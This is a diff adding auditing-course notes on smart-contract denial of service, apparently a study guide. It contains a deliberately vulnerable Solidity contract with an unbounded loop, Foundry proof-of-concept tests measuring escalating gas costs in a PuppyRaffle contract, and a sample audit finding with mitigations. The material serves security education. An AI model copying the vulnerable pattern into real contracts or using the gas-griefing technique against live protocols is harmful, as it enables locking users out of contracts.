@@ -79,6 +79,11 @@
 5. [Tooling: Solidity Visual Developer](#tooling-solidity-visual-developer)
 6. [Recon: Reading the docs](#recon-reading-the-docs)
 7. [Recon: Reading the code](#recon-reading-the-docs)
+8. [sc-exploits minimized](#sc-exploits-minimized)
+9. [Exploit: Denial of service](#exploit-denial-of-service)
+10. [Case Study: DoS](#case-study-dos)
+11. [DoS PoC](#dos-poc)
+12. [DoS: Reporting](#dos-reporting)
 
 </details>
 
@@ -1117,5 +1122,207 @@ We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate
 	- prints out a list of all the methods
 - [Vscode keyboard shortcuts](https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf)
 
+### sc-exploits minimized
+- [SC Exploits Minimized](https://github.com/Cyfrin/sc-exploits-minimized)
+	- A repository for a minimized example of certain bugs
 
+### Exploit: Denial of service
+```'// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
 
+contract DoS {
+    address[] entrants;
+
+    function enter() public {
+        // Check for duplicate entrants
+        for (uint256 i; i < entrants.length; i++) {
+            if (entrants[i] == msg.sender) {
+                revert("You've already entered!");
+            }
+        }
+        entrants.push(msg.sender);
+    }
+}
+```
+-  As the entrants array gets bigger, the contract can become unusable
+	- If the array become very large, the later entrants will pay enormous gas fees or the compiler may throw a gas error
+	- Early entrants are rewarded
+
+### Case Study: DoS
+- A DoS attack can arise from an unbounded for loop increasing gas prices or breaching the gas block limit
+- A DoS attack causes a function or transaction to not be able to execute
+	- A specific feature of the protocol is not able to execute
+	- Some functions may have `revert`... and a DoS attack could attempt to `revert` when a `revert` isn't supposed to occur
+- A DoS attack doesn't boil down to a specific root cause... it can be caused by a number of things
+	- It is a transaction that is being prevented from execution when it needs to be executed
+- DoS can be caused by:
+	- An unbounded for loop
+	- An external call failing
+- Whenever you encounter a for loop, ask if the thing being iterated is bound to a certain size
+- If you identify external calls, ask if there is a way for the calls to fail
+	- Sending ether to a contract that doesn't accept it
+	- Calling a function that doesn't exist
+	- The external call execution runs out of gas
+	- Third party external call is malicious
+
+### DoS PoC
+```solidity
+function testDoS() public {
+	vm.txGasPrice(1);
+
+	// first 100
+	uint256 playersNum = 100;
+	address[] memory players = new address[](playersNum);
+	for (uint256 i =0; i< playersNum; i++) {
+		players[i] = address(i);
+	}
+
+	uint256 gasStart = gasleft();
+	puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
+	uint256 gasEnd = gasleft();
+	uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+	console.log("first gas cost: ", gasUsedFirst);
+
+	// second 100
+	address[] memory players2 = new address[](playersNum);
+	for (uint256 i =0; i< playersNum; i++) {
+		players2[i] = address(i + playersNum);
+	}
+
+	uint256 gasStart2 = gasleft();
+	puppyRaffle.enterRaffle{value: entranceFee * 100}(players2);
+	uint256 gasEnd2 = gasleft();
+	uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
+	console.log("second gas cost: ", gasUsedSecond);
+}
+```
+
+```solidity
+    function testCanEnterRaffleDoS() public {
+        address firstPlayer = makeAddr("firstPlayer");
+        address secondPlayer = makeAddr("secondPlayer");  
+        address thirdPlayer = makeAddr("thirdPlayer");
+        address fourthPlayer = makeAddr("fourthPlayer");
+
+        address[] memory firstPlayerArray = new address[](1);
+        address[] memory secondPlayerArray = new address[](1);
+        address[] memory thirdPlayerArray = new address[](1);
+        address[] memory fourthPlayerArray = new address[](1);
+
+        firstPlayerArray[0] = firstPlayer;
+        secondPlayerArray[0] = secondPlayer;
+        thirdPlayerArray[0] = thirdPlayer;
+        fourthPlayerArray[0] = fourthPlayer;
+
+        address[] memory players = new address[](20);
+        for (uint256 i =0; i<20;i++) {
+            string memory addy = string(abi.encodePacked(i));
+            players[i] = makeAddr(addy);
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee}(firstPlayerArray);
+
+        uint256 gasStartA = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee}(secondPlayerArray);
+        uint256 gasCostA = gasStartA - gasleft();
+
+        uint256 gasStartB = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee}(thirdPlayerArray);
+        uint256 gasCostB = gasStartB - gasleft();
+
+        uint256 gasStartC = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee}(fourthPlayerArray);
+        uint256 gasCostC = gasStartC - gasleft();
+
+        uint256 gasStartD = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * 20}(players);
+        uint256 gasCostD = gasStartD - gasleft();
+
+        console.log("cost A:", gasCostA);
+        console.log("cost B:", gasCostB);
+        console.log("cost C:", gasCostC);
+        console.log("cost D:", gasCostD);
+    }
+```
+
+### DoS: Reporting
+```
+### [S-#] TITLE (Root Cause + Impact)
+
+**Description:**
+
+**Impact:**
+
+**Proof of Concept:**
+
+**Recommended Mitigation:**
+```
+
+````
+### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential (DoS) attack, incrementing gas cost for future entrants.
+
+**Description:** The `PuppyRaffle::enterRaffle` function loops through the `PuppyRaffle::players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. Gas costs for players that enter at the start will be lower than those who enter later. Every additional address in the `PuppyRaffle::players` array is an additional check the loop will have to make.
+
+```js
+address[] memory players2 = new address[](playersNum);
+for (uint256 i =0; i< playersNum; i++) {
+	players2[i] = address(i + playersNum);
+}
+```
+
+**Impact:** The gas costs for the raffle will depend on the the amount of players in the `PuppyRaffle::players` array. This dynamic promotes entering early and avoiding raffles that are "full".
+
+An attacker might make the `PuppyRaffle::players` array so big that no one else enters guaranteeing themselves the win.
+
+**Proof of Concept:**
+If we have two sets of 100 players, the gas costs will be:
+- 1st 100 players: ~6252048
+- 2nd 100 players: ~18068138
+
+More than 3x expensive for the second 100 players.
+
+<details>
+<summary>PoC</summary>
+Place the following test into `PuppyRaffleTest.t.sol`
+```js
+function testDoS() public {
+        vm.txGasPrice(1);
+
+        // first 100
+        uint256 playersNum = 100;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i =0; i< playersNum; i++) {
+            players[i] = address(i);
+        }
+
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
+        uint256 gasEnd = gasleft();
+
+        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+        console.log("first gas cost: ", gasUsedFirst);
+
+        // second 100
+        address[] memory players2 = new address[](playersNum);
+        for (uint256 i =0; i< playersNum; i++) {
+            players2[i] = address(i + playersNum);
+        }
+
+        uint256 gasStart2 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * 100}(players2);
+        uint256 gasEnd2 = gasleft();
+
+        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
+        console.log("second gas cost: ", gasUsedSecond);
+    }
+```
+</details>
+
+**Recommended Mitigation:**
+1. Consider allowing duplicates. Users can make new wallet addresses. Thus a duplicate check doesn't prevent the same person from entering multiple times.
+2. Consider using a mapping to check for duplicates. This would be a constant time check.
+3. Consider placing a constraint on `PuppyRaffle::players`
+````
+- For this specific bug, the impact and likelihood are both probably M
+- Sometimes, we hold off on the report as we investigate further. We may find that our "bug" is intended behavior
+- In a private audit, you may not need to include the proof of code in the PoC section. But you should definitely do so in a competitive audit
